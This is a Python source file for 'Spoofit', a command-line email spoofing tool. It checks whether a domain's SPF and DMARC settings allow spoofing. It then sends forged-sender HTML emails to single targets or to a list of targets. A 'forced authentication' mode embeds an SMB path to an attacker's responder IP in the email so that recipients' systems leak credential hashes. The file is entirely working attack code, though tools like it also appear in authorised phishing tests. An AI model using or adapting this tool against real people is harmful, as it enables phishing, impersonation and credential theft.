import smtplib
import dns.resolver
import argparse
import os
import configparser

def print_banner():
    """Prints the ASCII art banner."""
    banner = """
   _____                   _____ __ 
  / ___/____  ____  ____  / __(_) /_
  \__ \/ __ \/ __ \/ __ \/ /_/ / __/
 ___/ / /_/ / /_/ / /_/ / __/ / /_  
/____/ .___/\____/\____/_/ /_/\__/  
    /_/                             

   """
    print(banner)

def get_domain_from_email(email):
    return email.split('@')[1]

def get_mx_record(domain):
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        mx_record = min(answers, key=lambda r: r.preference).exchange.to_text()
        return mx_record
    except Exception as e:
        print(f"[!] Error retrieving MX record: {e}")
        return None

def send_email(mx_record, sender, recipient, subject, body):
    try:
        with smtplib.SMTP(mx_record, 25) as server:
            server.ehlo_or_helo_if_needed()
            server.mail(sender)
            code, msg = server.rcpt(recipient)
            if code != 250:
                print(f"[!] Failed to send email to {recipient}: {msg}")
                return
            server.data(f"To: {recipient}\r\nFrom: {sender}\r\nSubject: {subject}\r\nContent-Type: text/html\r\n\r\n{body}")
            print(f"[+] Email sent to {recipient}")
    except smtplib.SMTPRecipientsRefused:
        print(f"[!] Recipient refused: {recipient}")
    except smtplib.SMTPException as e:
        print(f"[!] Error sending email to {recipient}: {e}")

def load_config(forced=False):
    config = configparser.ConfigParser()
    config_file = 'conf/spoofit.conf'
    
    if not os.path.exists(config_file):
        print(f"[!] Configuration file {config_file} does not exist.")
        return None

    config.read(config_file)
    
    if forced:
        subject = config.get('ForcedAuthEmail', 'subject')
        body_file = config.get('ForcedAuthEmail', 'body_file')
        with open(body_file, 'r') as file:
            body = file.read()
    else:
        subject = config.get('Email', 'subject')
        body = config.get('Email', 'body')

    return subject, body

def create_forced_auth_email(body_template, responder_ip):
    return body_template % {'responder': responder_ip}

def check_spoofability(domain):
    try:
        spoofable = False
        weaknesses = []

        try:
            spf_record = dns.resolver.resolve(domain, 'TXT')
            spf_record = [str(r) for r in spf_record if "v=spf1" in str(r)]
            if not spf_record:
                weaknesses.append("No SPF record found.")
                spoofable = True
            elif not any(all_item in spf_record[0] for all_item in ["~all", "-all"]):
                weaknesses.append("SPF record does not specify ~all or -all.")
                spoofable = True
        except dns.resolver.NoAnswer:
            weaknesses.append("No SPF record found.")
            spoofable = True

        try:
            dmarc_record = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
            dmarc_record = str(dmarc_record[0])
            if "p=none" in dmarc_record:
                print(f"\033[93m[!] DMARC policy is set to 'p=none' for {domain}.\033[0m")
                spoofable = True
            elif "p=quarantine" in dmarc_record:
                print(f"\033[93m[!] DMARC policy is set to 'quarantine' for {domain}.\033[0m")
            elif "p=reject" not in dmarc_record:
                weaknesses.append("DMARC policy is not set to 'reject'.")
                spoofable = True
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            weaknesses.append("No DMARC record found.")
            spoofable = True

        if spoofable:
            print(f"\033[92m[+] Spoofing possible for {domain}!\033[0m")
            for weakness in weaknesses:
                print(f"    - {weakness}")
        else:
            print(f"\033[91m[-] Spoofing not possible for {domain}...\033[0m")

    except Exception as e:
        print(f"[!] Error checking spoofability: {e}")

def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="Email Spoofing Tool",
        epilog="""
Examples:
  To check if the target domain is spoofable:
    Spoofit.py -c <domain.com>

  To send a spoofed email to the target (or list of targets):
    Spoofit.py -s <sender@domain.com> -r <recipient@domain.com or recipients.txt>

  To send a spoofed email containing an embedded forced authentication image to a target (or list of targets):
    Spoofit.py -s <sender@domain.com> -r <recipient@domain.com or recipients.txt> -f <responder-ip>
        """,
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('-c', '--check', help='Check if a domain is vulnerable to spoofing (SPF, DMARC)')
    parser.add_argument('-s', '--sender', help='Email address to use as the spoofed sender')
    parser.add_argument('-r', '--recipients', help='Recipient email address or file containing multiple addresses')
    parser.add_argument('-f', '--forced', help='Optional: Forced authentication email with responder IP')

    args = parser.parse_args()

    if not any(vars(args).values()):
        parser.print_help()
        return

    if args.check:
        check_spoofability(args.check)
        return

    if args.recipients and args.sender:
        recipients = []
        if os.path.isfile(args.recipients):
            with open(args.recipients, 'r') as f:
                recipients = [line.strip() for line in f if line.strip()]
        else:
            recipients.append(args.recipients)

        if args.forced:
            config_result = load_config(forced=True)
            if config_result is None:
                return

            email_subject, body_template = config_result
            email_body = create_forced_auth_email(body_template, args.forced)
            print(f"[*] Sending forced authentication email to {len(recipients)} target{'s' if len(recipients) > 1 else ''} with SMB path to {args.forced}.")
        else:
            config_result = load_config()
            if config_result is None:
                return

            email_subject, email_body = config_result
            print(f"...Sending spoofed email to {len(recipients)} target{'s' if len(recipients) > 1 else ''}.")

        domain = get_domain_from_email(args.sender)
        mx_record = get_mx_record(domain)
        if not mx_record:
            print("Failed to retrieve MX record. Exiting...")
            return

        for recipient in recipients:
            send_email(mx_record, args.sender, recipient, email_subject, email_body)

if __name__ == "__main__":
    main()
